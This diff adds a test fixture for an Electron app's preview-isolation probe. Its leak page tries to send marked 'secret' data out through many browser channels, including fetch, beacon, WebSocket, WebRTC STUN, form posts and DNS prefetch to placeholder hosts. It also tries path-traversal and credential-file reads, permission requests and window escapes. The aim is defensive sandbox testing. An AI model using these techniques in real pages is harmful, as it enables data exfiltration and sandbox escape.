@@ -1,0 +1,185 @@
+// Pages the isolation probe writes into a task workspace, as an agent would
+// (plan 2.6 "Electron 통합 프로브"). `leak.html` tries every way out it can
+// think of and reports what happened; nothing here is shipped with the app.
+'use strict';
+
+function leakPage({ httpPort, udpPort, marker }) {
+  const script = String.raw`
+const H = "http://127.0.0.1:${httpPort}";
+const WS = "ws://127.0.0.1:${httpPort}";
+const UDP = ${udpPort};
+const MARK = "${marker}";
+const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+const within = (promise, ms = 4000) => Promise.race([promise, sleep(ms).then(() => { throw new Error("timeout"); })]);
+const describe = error => String(error && (error.name && error.name !== "Error" ? error.name + ": " : "") + (error && error.message || error));
+const out = {};
+async function attempt(name, fn) {
+  try { out[name] = { ok: true, value: await within(Promise.resolve().then(fn)) }; }
+  catch (error) { out[name] = { ok: false, error: describe(error) }; }
+}
+function element(tag, attributes, ms = 1500) {
+  return new Promise((resolve, reject) => {
+    const node = document.createElement(tag);
+    Object.assign(node, attributes);
+    node.onload = () => resolve("loaded");
+    node.onerror = () => reject(new Error(tag + " error"));
+    document.body.append(node);
+    setTimeout(() => resolve("noEvent"), ms);
+  });
+}
+// T1: every way to send something out. Also run again by the probe with
+// CSP bypassed (then webRequest must stop it) and without webRequest (then
+// the dead proxy must): each layer alone holds.
+window.runNetwork = async () => {
+  for (const key of Object.keys(out)) delete out[key];
+  await network();
+  return { ...out };
+};
+window.runProbe = async () => {
+  await network();
+  await rest();
+  return out;
+};
+async function network() {
+  await attempt("fetchLoopback", () => fetch(H + "/fetch?s=secret").then(r => r.status));
+  await attempt("fetchNoCors", () => fetch(H + "/nocors", { mode: "no-cors" }).then(r => r.type));
+  await attempt("fetchExternal", () => fetch("https://" + MARK + "-fetch.example.com/").then(r => r.status));
+  await attempt("xhr", () => new Promise((resolve, reject) => { const x = new XMLHttpRequest(); x.open("GET", H + "/xhr"); x.onload = () => resolve(x.status); x.onerror = () => reject(new Error("xhr error")); x.send(); }));
+  await attempt("image", () => element("img", { src: H + "/img.png" }));
+  await attempt("imageExternal", () => element("img", { src: "https://" + MARK + "-img.example.com/x.png" }));
+  await attempt("beacon", () => navigator.sendBeacon(H + "/beacon", "secret"));
+  await attempt("websocket", () => new Promise((resolve, reject) => { const w = new WebSocket(WS + "/ws"); w.onopen = () => resolve("open"); w.onerror = () => reject(new Error("ws error")); }));
+  await attempt("eventSource", () => new Promise((resolve, reject) => { const e = new EventSource(H + "/sse"); e.onopen = () => resolve("open"); e.onerror = () => { e.close(); reject(new Error("sse error")); }; }));
+  await attempt("script", () => element("script", { src: H + "/s.js" }));
+  await attempt("stylesheet", () => element("link", { rel: "stylesheet", href: H + "/s.css" }));
+  await attempt("cssImport", async () => { const s = document.createElement("style"); s.textContent = "@import url(" + H + "/import.css); .bg { background: url(" + H + "/bg.png) }"; document.head.append(s); const d = document.createElement("div"); d.className = "bg"; document.body.append(d); await sleep(800); return "attempted"; });
+  await attempt("font", () => new FontFace("leak", "url(" + H + "/f.woff2)").load().then(() => "loaded"));
+  await attempt("dynamicImport", () => import(H + "/m.js").then(() => "imported"));
+  await attempt("audio", () => new Audio(H + "/a.mp3").play().then(() => "playing"));
+  await attempt("hints", async () => {
+    for (const [rel, href] of [["dns-prefetch", "//" + MARK + "-dns.example.com"], ["preconnect", "https://" + MARK + "-preconnect.example.com"], ["prefetch", H + "/prefetch"], ["preconnect", H], ["prerender", H + "/prerender"]]) {
+      const link = document.createElement("link"); link.rel = rel; link.href = href; document.head.append(link);
+    }
+    const a = document.createElement("a"); a.href = "https://" + MARK + "-anchor.example.com/"; a.textContent = "x"; document.body.append(a);
+    await sleep(1500); return "attempted";
+  });
+  await attempt("iframeExternal", () => element("iframe", { src: H + "/frame" }));
+  await attempt("worker", () => new Promise((resolve, reject) => {
+    const code = "fetch('" + H + "/worker').then(r => postMessage('status ' + r.status), e => postMessage('error ' + e.name))";
+    const worker = new Worker(URL.createObjectURL(new Blob([code], { type: "text/javascript" })));
+    worker.onmessage = event => resolve(event.data); worker.onerror = () => reject(new Error("worker error"));
+  }));
+  await attempt("formPost", async () => {
+    const frame = document.createElement("iframe"); frame.name = "sink"; document.body.append(frame);
+    const form = document.createElement("form"); form.action = H + "/form"; form.method = "post"; form.target = "sink";
+    const input = document.createElement("input"); input.name = "s"; input.value = "secret"; form.append(input); document.body.append(form);
+    form.submit(); await sleep(1000); return "submitted";
+  });
+  // T2: WebRTC to a local STUN collector and an outside one.
+  await attempt("webrtc", async () => {
+    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:" + UDP }, { urls: "stun:" + MARK + "-stun.example.com:3478" }] });
+    const candidates = [];
+    pc.onicecandidate = event => { if (event.candidate) candidates.push(event.candidate.type || "unknown"); };
+    pc.createDataChannel("x");
+    await pc.setLocalDescription(await pc.createOffer());
+    await sleep(3000);
+    pc.close();
+    return candidates;
+  });
+}
+async function rest() {
+  // T6: no app bridge, no Node.
+  out.bridges = Object.fromEntries(["m5", "m5Preview", "m5Projects", "m5Login", "require", "process", "ipcRenderer", "electron", "module", "Buffer"].map(name => [name, typeof window[name]]));
+  // T7: no way to write.
+  for (const method of ["POST", "PUT", "DELETE", "PATCH"]) await attempt("method" + method, () => fetch("leak.html", { method, body: method === "DELETE" ? undefined : "x" }).then(r => r.status));
+  await attempt("saveFilePicker", () => window.showSaveFilePicker ? window.showSaveFilePicker() : Promise.reject(new Error("unavailable")));
+  await attempt("directoryPicker", () => window.showDirectoryPicker ? window.showDirectoryPicker() : Promise.reject(new Error("unavailable")));
+  await attempt("download", async () => { const a = document.createElement("a"); a.href = "data.txt"; a.download = "data.txt"; document.body.append(a); a.click(); await sleep(800); return "clicked"; });
+  // T4·T5 through the origin.
+  out.paths = {};
+  for (const path of [".env", ".git/HEAD", ".git/config", "a/.secret/x.js", "secret.pem", "link.txt", "../outside.txt", "%2e%2e/outside.txt", "a%2f..%2f..%2foutside.txt", "data.txt"]) {
+    try { const response = await fetch(path); out.paths[path] = response.status; } catch (error) { out.paths[path] = describe(error); }
+  }
+  // T10: every permission.
+  await attempt("camera", () => navigator.mediaDevices.getUserMedia({ video: true }).then(() => "granted"));
+  await attempt("microphone", () => navigator.mediaDevices.getUserMedia({ audio: true }).then(() => "granted"));
+  await attempt("displayMedia", () => navigator.mediaDevices.getDisplayMedia({ video: true }).then(() => "granted"));
+  await attempt("geolocation", () => new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(() => resolve("granted"), error => reject(new Error("geolocation " + error.code)))));
+  await attempt("notification", () => Notification.requestPermission());
+  await attempt("clipboardRead", () => navigator.clipboard.readText().then(() => "read"));
+  await attempt("hid", () => navigator.hid ? navigator.hid.requestDevice({ filters: [] }).then(devices => "devices " + devices.length) : Promise.reject(new Error("unavailable")));
+  await attempt("usb", () => navigator.usb ? navigator.usb.requestDevice({ filters: [] }).then(() => "granted") : Promise.reject(new Error("unavailable")));
+  await attempt("serial", () => navigator.serial ? navigator.serial.requestPort().then(() => "granted") : Promise.reject(new Error("unavailable")));
+  await attempt("midi", () => navigator.requestMIDIAccess({ sysex: true }).then(() => "granted"));
+  await attempt("fullscreen", () => document.documentElement.requestFullscreen().then(() => "granted"));
+  await attempt("permissionGeolocation", () => navigator.permissions.query({ name: "geolocation" }).then(status => status.state));
+  // T13
+  await attempt("serviceWorker", () => navigator.serviceWorker ? navigator.serviceWorker.register("sw.js").then(() => "registered") : Promise.reject(new Error("unavailable")));
+  // T9
+  await attempt("windowOpen", () => window.open(H + "/open") === null ? "null" : "opened");
+  await attempt("targetBlank", async () => { const a = document.createElement("a"); a.href = H + "/blank"; a.target = "_blank"; document.body.append(a); a.click(); await sleep(500); return "clicked"; });
+  await attempt("frameRefresh", async () => {
+    const frame = document.createElement("iframe"); frame.src = "refresh.html"; document.body.append(frame);
+    await sleep(2000); return frame.contentWindow.location.pathname;
+  });
+  await attempt("frameNavigate", async () => {
+    const frame = document.createElement("iframe"); frame.src = "data.txt"; document.body.append(frame);
+    await sleep(500); frame.src = H + "/framenav"; await sleep(1000);
+    try { return frame.contentWindow.location.pathname; } catch (error) { return "crossOrigin " + describe(error); }
+  });
+  await attempt("eval", () => eval("1 + 1"));
+  // T12: this preview's storage (the probe checks another preview cannot see it).
+  out.storageBefore = localStorage.getItem("probe-key");
+  localStorage.setItem("probe-key", "leak-page");
+  out.location = location.href;
+}
+`;
+  return `<!doctype html><html><head><meta charset="utf-8"><title>leak</title></head><body><p id="status">ready</p><script>${script}</script></body></html>`;
+}
+
+const TODO_PAGE = `<!doctype html>
+<html lang="ko"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>할 일</title><link rel="stylesheet" href="todo.css"></head>
+<body><main><h1>할 일</h1>
+<form id="add"><input id="text" placeholder="할 일을 적어 주세요" autocomplete="off"><button>추가</button></form>
+<ul id="list"></ul><p id="count"></p></main>
+<script src="todo.js"></script></body></html>`;
+const TODO_CSS = `body{font-family:-apple-system,system-ui,sans-serif;background:#f6f7f9;margin:0;padding:24px;color:#1d2433}
+main{max-width:520px;margin:0 auto;background:#fff;border-radius:12px;padding:20px;box-shadow:0 2px 12px #0001}
+form{display:flex;gap:8px}input{flex:1;padding:10px;border:1px solid #ccd;border-radius:8px;font-size:16px}
+button{padding:10px 16px;border:0;border-radius:8px;background:#3b6cf6;color:#fff;font-size:16px}
+li{padding:10px 4px;border-bottom:1px solid #eee;list-style:none}li.done{text-decoration:line-through;color:#889}
+ul{padding:0}@media (max-width:420px){body{padding:8px}h1{font-size:22px}}`;
+const TODO_JS = `const key = "todos";
+const load = () => JSON.parse(localStorage.getItem(key) || "[]");
+const save = items => localStorage.setItem(key, JSON.stringify(items));
+function render() {
+  const items = load(); const list = document.getElementById("list"); list.textContent = "";
+  for (const [index, item] of items.entries()) {
+    const li = document.createElement("li"); li.textContent = item.text; li.className = item.done ? "done" : "";
+    li.onclick = () => { const next = load(); next[index].done = !next[index].done; save(next); render(); };
+    list.append(li);
+  }
+  document.getElementById("count").textContent = items.filter(item => !item.done).length + "개 남음";
+}
+document.getElementById("add").onsubmit = event => {
+  event.preventDefault(); const input = document.getElementById("text");
+  if (!input.value.trim()) return; save([...load(), { text: input.value.trim(), done: false }]); input.value = ""; render();
+};
+render();`;
+
+const FILES = {
+  "index.html": TODO_PAGE,
+  "todo.css": TODO_CSS,
+  "todo.js": TODO_JS,
+  "data.txt": "workspace data\n",
+  "refresh.html": '<!doctype html><meta http-equiv="refresh" content="0;url=REFRESH_TARGET"><p>refresh</p>',
+  "sw.js": "self.addEventListener('fetch', () => {});",
+  "hang.html": '<!doctype html><p id="s">hang</p><script>setTimeout(() => { for (;;) {} }, 300)</script>',
+  "b.html": '<!doctype html><p>b</p><script>localStorage.setItem("probe-key", "workspace-b")</script>',
+  "b.txt": "workspace b only\n",
+  ".env": "fixture-only\n",
+  "secret.pem": "fixture-only\n",
+};
+
+module.exports = { leakPage, FILES };
